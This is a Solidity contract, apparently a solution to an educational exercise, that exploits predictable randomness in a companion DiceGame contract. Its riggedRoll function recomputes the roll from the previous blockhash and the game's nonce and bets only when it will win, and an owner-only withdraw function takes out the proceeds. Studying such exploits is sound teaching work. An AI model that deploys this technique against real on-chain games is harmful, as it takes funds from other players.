pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address _to, uint256 _amount)public onlyOwner{
        (bool success,)=_to.call{value: _amount}('');
        require(success, 'Failed to withdraw');
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll()public{
        require(address(this).balance >= 0.002 ether, "Not enough value in contract");

        bytes32 prevHash = blockhash(block.number-1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame),diceGame.nonce()));
        uint256 roll = uint(hash)%16;
        console.log('rigged, block.number:', block.number);
        console.log('rigged, address(diceGame):', address(diceGame));
        console.log('rigged, diceGame.nonce:', diceGame.nonce());

        console.log('Rigged roll:', roll);

        if(roll>2){return;}

        diceGame.rollTheDice{value:0.002 ether}();
    }

    //Add receive() function so contract can receive Eth
    receive()external payable{}
}
